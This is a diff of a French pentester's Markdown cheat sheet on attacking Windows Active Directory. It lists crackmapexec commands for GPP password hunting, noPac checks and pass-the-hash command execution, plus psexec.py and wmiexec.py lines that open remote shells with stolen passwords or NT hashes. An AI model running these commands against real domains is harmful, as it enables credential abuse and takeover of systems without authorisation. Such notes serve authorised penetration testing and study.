@@ -25,15 +25,16 @@ Synchroniser l'horloge:
 `sudo ntpdate <ip>`
 
 - `crackmapexec`:
-	- check GPPPassword ([share spidering](https://www.infosecmatter.com/crackmapexec-module-library/?cmem=smb-spider_plus): `cme smb <DC.local> -u <user> -p <pass> -M spider_plus`
-	- check SamAccountName: `crackmapexec smb <ip> -M nopac` & `crackmapexec ldap -d <DC.local> -u <user> -p <pass> -M Maq`
+	- check GPPPassword ([share spidering](https://www.infosecmatter.com/crackmapexec-module-library/?cmem=smb-spider_plus): spider_plus): `cme smb <Domain> -u <user> -p <pass> -M gpp_password`
+	- check SamAccountName: `crackmapexec smb <ip> -M nopac` & `crackmapexec ldap -d <Domain> -u <user> -p <pass> -M Maq` (max machines à créer)
 	- Pass The Hash: `crackmapexec <ip> -u Administrator -H <lmhash:nthash> -x 'whoami'`
 
 ## Shell
 
-`psexec.py <DC>/<user>:<pass>@<DC.local>`
+**Domain.local/Administrator@127.0.0.1**
 
-`wmiexec.py <DC>/<user>@<DC.local> -hashes ':<nthash>'`
+`psexec.py <Domain>/<user>:<pass>@<DC.local>`
+`wmiexec.py <Domain>/<user>@<DC.local> -hashes ':<nthash>'`
 
 ## FreeRDP2
 
